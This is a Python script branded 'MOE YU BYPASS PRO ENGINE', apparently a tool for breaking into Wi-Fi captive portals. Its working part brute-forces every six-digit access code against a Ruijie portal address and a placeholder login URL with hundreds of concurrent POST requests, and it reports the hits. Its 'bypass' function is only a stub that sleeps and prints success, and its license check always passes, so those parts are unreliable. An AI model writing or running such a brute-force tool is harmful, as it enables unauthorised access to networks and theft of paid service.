import asyncio, aiohttp, requests, re, urllib3, time, os, uuid, sys, datetime, random
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

# ===============================
# CONFIGURATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()
URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

PORTALS = {
    "1": {"name": "Ruijie Old Portal", "url": "http://192.168.60.1/auth", "payload": "code"},
    "2": {"name": "Modern Captive Portal", "url": "http://target-portal.com/login", "payload": "password"}
}

BABY_LOGO = "\n[bold cyan]      _ \n    _(_)_ \n   (_)@(_) \n     (_)\  / \n      /  || \n  ___/___||___\n |____________|[/bold cyan]"
BANNER = "[bold #00FF00]\n ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦\n ║║║║ ║║╣   ╚╦╝║ ║\n ╩ ╩╚═╝╚═╝   ╩ ╚═╝\n      [#00FF00]M O E   Y U   H A C K E R[/#00FF00][/bold #00FF00]"

# ===============================
# UTILS & LICENSE
# ===============================
def display_hacker_flag():
    console.clear()
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v6.5 (FULL)[/bold cyan]\n"))

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    if os.path.exists(id_file):
        with open(id_file, "r") as f: return f.read().strip()
    new_id = f"MOE-{str(uuid.uuid4()).split('-')[0].upper()}"
    with open(id_file, "w") as f: f.write(new_id)
    return new_id

def check_license_hacker_style():
    my_hwid = get_hwid()
    display_hacker_flag()
    console.print(Align.center(Panel(f"[bold white]HWID: [yellow]{my_hwid}[/yellow][/bold white]", border_style="bold cyan", expand=False)))
    user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
    # (License validation logic here)
    return True 

# ===============================
# ASYNC SCANNER
# ===============================
async def scan(session, code, target_cfg):
    try:
        async with session.post(target_cfg['url'], data={target_cfg['payload']: code}, timeout=2) as resp:
            text = await resp.text()
            if "Success" in text or "200" in str(resp.status):
                console.print(f"[bold green][!] Found Hit: {code}[/bold green]")
                return True
    except: pass
    return False

async def run_scanner(target_cfg):
    console.print(f"[yellow][*] Scanning {target_cfg['name']}...[/yellow]")
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(100000, 999999):
            tasks.append(scan(session, str(i), target_cfg))
            if len(tasks) >= 500:
                await asyncio.gather(*tasks)
                tasks = []
        await asyncio.gather(*tasks)

# ===============================
# BYPASS ENGINE
# ===============================
def start_bypass_process():
    console.print("[yellow][*] Starting Bypass Engine...[/yellow]")
    # ဒီနေရာမှာ အရင်က သုံးနေတဲ့ Session/Redirect Logic တွေကို ထည့်ပါ
    time.sleep(2)
    console.print("[green]>>> Bypass Active![/green]")

# ===============================
# MAIN
# ===============================
if __name__ == "__main__":
    if check_license_hacker_style():
        while True:
            display_hacker_flag()
            console.print(Panel("[bold white]1. Start Bypass\n2. Start Scanner\n3. Exit[/bold white]", title="[bold cyan]MENU[/bold cyan]"))
            choice = input(" [?] Choose Option: ")
            
            if choice == "1":
                start_bypass_process()
            elif choice == "2":
                console.print("[white]Choose Target:[/white]\n1. Old Portal\n2. New Portal")
                target_choice = input(" [?] >> ")
                target = PORTALS.get(target_choice)
                if target:
                    try:
                        asyncio.run(run_scanner(target))
                    except KeyboardInterrupt:
                        console.print("\n[red]Scanning Stopped![/red]")
            elif choice == "3":
                sys.exit()
